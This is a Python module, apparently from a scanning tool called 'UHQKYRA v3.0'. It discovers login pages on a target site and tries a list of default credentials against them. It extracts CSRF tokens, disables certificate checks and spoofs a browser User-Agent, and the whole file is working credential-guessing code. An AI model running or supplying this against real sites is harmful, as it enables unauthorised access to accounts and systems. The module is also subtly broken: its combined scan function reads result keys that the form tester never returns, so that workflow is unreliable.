"""
Login Brute Force / Default Credentials - UHQKYRA v3.0
Tests common default credentials on login forms
"""
import re
import warnings
warnings.filterwarnings("ignore")

try:
    import requests
    requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", ""), ("administrator", "administrator"),
    ("administrator", "password"), ("root", "root"), ("root", "toor"),
    ("root", "password"), ("user", "user"), ("user", "password"),
    ("test", "test"), ("guest", "guest"), ("demo", "demo"),
    ("admin", "1234"), ("admin", "12345"), ("admin", "123"),
    ("admin", "qwerty"), ("admin", "letmein"), ("admin", "welcome"),
    ("admin", "monkey"), ("admin", "dragon"), ("admin", "master"),
    ("admin", "pass"), ("admin", "changeme"), ("admin", "default"),
    ("admin", "admin@123"), ("admin", "Admin123"), ("admin", "P@ssw0rd"),
    # Common app defaults
    ("pi", "raspberry"), ("ubnt", "ubnt"), ("cisco", "cisco"),
    ("tomcat", "tomcat"), ("manager", "manager"),
]


def test_login_form(url, callback=None):
    """Find and test login form with default credentials"""
    def cb(t, m):
        if callback: callback({"type": t, "message": m})

    results = {
        "login_found": False, "login_url": None,
        "form_fields": [], "vulnerable": False,
        "cracked_creds": [], "findings": []
    }

    if not HAS_REQUESTS:
        cb("error", "requests non disponible")
        return results

    s = requests.Session()
    s.headers.update(HEADERS)
    s.verify = False

    base = url if "://" in url else "http://" + url
    cb("info", f"Recherche formulaire de login: {base}")

    # Find login form
    login_urls = [base]
    common_login_paths = ["/login", "/admin", "/wp-login.php", "/administrator",
                          "/user/login", "/account/login", "/auth/login",
                          "/signin", "/sign-in", "/panel"]

    for path in common_login_paths:
        try:
            r = s.get(base + path, timeout=8, allow_redirects=True)
            if r.status_code == 200 and re.search(r'<input[^>]+type=["\']password["\']', r.text, re.I):
                login_urls.append(r.url)
                cb("found", f"Login form: {path}")
        except Exception:
            pass

    for login_url in login_urls[:3]:
        try:
            r = s.get(login_url, timeout=10)
            if not re.search(r'<input[^>]+type=["\']password["\']', r.text, re.I):
                continue

            results["login_found"] = True
            results["login_url"] = login_url

            # Extract form fields
            user_field = _find_field(r.text, ["username", "user", "email", "login", "name", "uname"])
            pass_field = _find_field(r.text, ["password", "pass", "passwd", "pwd"])

            if not user_field or not pass_field:
                cb("warn", "Champs login non detectes")
                continue

            # Get CSRF token if any
            csrf_field, csrf_value = _get_csrf(r)

            cb("info", f"Test {len(DEFAULT_CREDS)} credentials sur {login_url}...")
            base_size = len(r.text)

            for username, password in DEFAULT_CREDS[:30]:
                try:
                    data = {user_field: username, pass_field: password}
                    if csrf_field:
                        data[csrf_field] = csrf_value

                    resp = s.post(login_url, data=data, timeout=10, allow_redirects=True)

                    # Detect successful login
                    if _is_login_success(resp, base_size):
                        results["vulnerable"] = True
                        results["cracked_creds"].append({"username": username, "password": password})
                        results["findings"].append({
                            "type": "default_credentials",
                            "severity": "critical",
                            "name": f"Credentials par defaut: {username}:{password}",
                            "detail": login_url
                        })
                        cb("vuln", f"LOGIN REUSSI ! {username}:{password} sur {login_url}")
                        break

                except Exception:
                    pass
        except Exception:
            pass

    if not results["vulnerable"] and callback:
        cb("ok", f"Pas de credentials par defaut trouves ({len(DEFAULT_CREDS)} testes)")

    return results


def _find_field(html, candidates):
    for cand in candidates:
        m = re.search(
            rf'<input[^>]+name=["\']({cand}[\w]*)["\'][^>]*type=["\'](?:text|email|password)["\']|'
            rf'<input[^>]+type=["\'](?:text|email|password)["\'][^>]+name=["\']({cand}[\w]*)["\']',
            html, re.I
        )
        if m:
            return next(v for v in m.groups() if v)
    return None


def _get_csrf(response):
    patterns = [
        r'<input[^>]+name=["\'](_token|csrf_token|csrfmiddlewaretoken|__RequestVerificationToken|authenticity_token)["\'][^>]+value=["\']([^"\']+)["\']',
        r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\'](_token|csrf_token|csrfmiddlewaretoken)["\']',
    ]
    for p in patterns:
        m = re.search(p, response.text, re.I)
        if m:
            groups = [g for g in m.groups() if g]
            if len(groups) >= 2:
                return groups[0], groups[1]
    return None, None


def _is_login_success(resp, base_size):
    text = resp.text.lower()
    fail_patterns = ["invalid", "incorrect", "wrong", "failed", "error",
                     "bad credentials", "username or password"]
    if any(p in text for p in fail_patterns):
        return False
    success_patterns = ["dashboard", "welcome", "logout", "sign out",
                        "my account", "profile", "logged in", "home"]
    if any(p in text for p in success_patterns):
        return True
    if resp.status_code == 302:
        return True
    return abs(len(resp.text) - base_size) > 500


# Common login page paths
_LOGIN_PATHS = [
    "/login", "/signin", "/sign-in", "/auth", "/admin", "/admin/login",
    "/wp-login.php", "/wp-admin", "/user/login", "/account/login",
    "/login.php", "/login.aspx", "/panel", "/dashboard", "/portal",
    "/phpmyadmin", "/cpanel", "/api/login", "/api/auth",
]

try:
    import requests as _requests
    _requests.packages.urllib3.disable_warnings()
    _HAS_REQ = True
except ImportError:
    _HAS_REQ = False


def find_login_pages(base_url, callback=None):
    """Discover login pages on the target"""
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})
    found = []
    if not _HAS_REQ:
        return found
    base = base_url.rstrip("/")
    for path in _LOGIN_PATHS:
        try:
            url = base + path
            r = _requests.get(url, timeout=8, verify=False,
                              headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True)
            if r.status_code in (200, 401, 403):
                if any(x in r.text.lower() for x in ["password", "login", "sign in", "username", "email"]):
                    found.append({"url": url, "status": r.status_code})
                    cb("found", f"Login page: {url} [{r.status_code}]")
        except Exception:
            continue
    return found


def scan_login_bruteforce(base_url, callback=None):
    """Full workflow: discover login pages + test each with default creds."""
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})
    all_res = {"login_pages": [], "successes": [], "vulnerabilities": [], "attempts": 0}
    pages = find_login_pages(base_url, callback=callback)
    all_res["login_pages"] = [p["url"] for p in pages]
    for page in pages[:3]:
        r = test_login_form(page["url"], callback=callback)
        all_res["successes"].extend(r.get("successes", []))
        all_res["vulnerabilities"].extend(r.get("vulnerabilities", []))
        all_res["attempts"] += r.get("attempts", 0)
    return all_res
